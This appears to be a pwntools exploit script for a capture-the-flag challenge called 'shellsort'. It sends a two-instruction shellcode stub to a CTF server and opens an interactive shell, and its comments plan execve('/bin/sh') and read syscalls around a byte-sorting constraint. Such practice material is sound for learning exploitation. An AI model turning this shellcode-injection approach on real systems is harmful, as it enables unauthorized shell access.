#!/usr/bin/env python2
from pwn import *

file = './shellsort'
# server, port = 'localhost'  , 9999
server, port = 'csie.ctf.tw', 10121

r, context.binary = remote(server, port), file
# ========================================================================

# read buf in [rbp-0x2720]
# sort buf in ascendent order, unit is bytes
# final, call [rbp-0x2720]

# rax = sys_execve  = 0x0           -> 0x3b
# rdi = *filename   = 0x0           -> "/bin/sh\0"
# rsi = argv[]      = 0x0
# rdx = envp[]      = [rbp-0x2720]  -> 0x0


# rax = sys_read    = 0x0
# rdi = fd          = 0x0
# rsi = *buf        = 0x0           -> rsp
# rdx = count       = [rbp-0x2720]
shellcode = asm("""
    xor rsi, [rbp-0x270]
    syscall
""")

# print shellcraft.xor( 0x01, 'rsi' )

print list(shellcode)
print sorted(list(shellcode), reverse = True)

r.send(shellcode)
r.interactive()
